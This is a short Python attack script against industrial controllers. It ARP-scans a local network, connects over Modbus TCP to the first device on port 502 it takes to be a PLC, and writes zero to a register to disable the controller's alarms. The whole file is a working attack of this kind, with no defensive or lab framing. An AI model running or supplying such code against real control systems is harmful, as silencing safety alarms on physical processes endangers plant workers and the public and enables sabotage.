from pymodbus.client import ModbusTcpClient
from scapy.all import ARP, Ether, srp

# Step 1: Scan the network to find PLC's IP based on response on Modbus (Port 502)
def find_plc_ip(network_range="192.168.1.0/24"):
    print("[*] Scanning network for PLC...")

    # ARP request to find alive hosts
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network_range)
    answered_list, _ = srp(arp_request, timeout=2, verbose=False)

    # Check for Modbus TCP (Port 502)
    for sent, received in answered_list:
        ip = received.psrc
        client = ModbusTcpClient(ip)
        if client.connect():
            print(f"[+] Found PLC at {ip}")
            client.close()
            return ip

    print("[-] No PLC found on the network.")
    return None

# Step 2: Modify Alarm Settings
def modify_alarm_settings(plc_ip):
    print(f"[*] Connecting to PLC at {plc_ip} to modify alarm settings...")

    client = ModbusTcpClient(plc_ip)
    if not client.connect():
        print("[-] Could not connect to PLC")
        return

    # Alarm registers - These vary by vendor. Example using coils/registers.
    ALARM_REGISTER = 40010  # Example Modbus register address
    DISABLE_ALARM_VALUE = 0  # Write 0 to disable alarms (depends on device setup)

    # Modify alarm settings
    response = client.write_register(ALARM_REGISTER, DISABLE_ALARM_VALUE)
    if response.isError():
        print("[-] Failed to modify alarm settings")
    else:
        print("[+] Alarm settings modified successfully")

    client.close()


# Main Execution
plc_ip = find_plc_ip()
if plc_ip:
    modify_alarm_settings(plc_ip)
else:
    print("[-] No PLC found. Exiting.")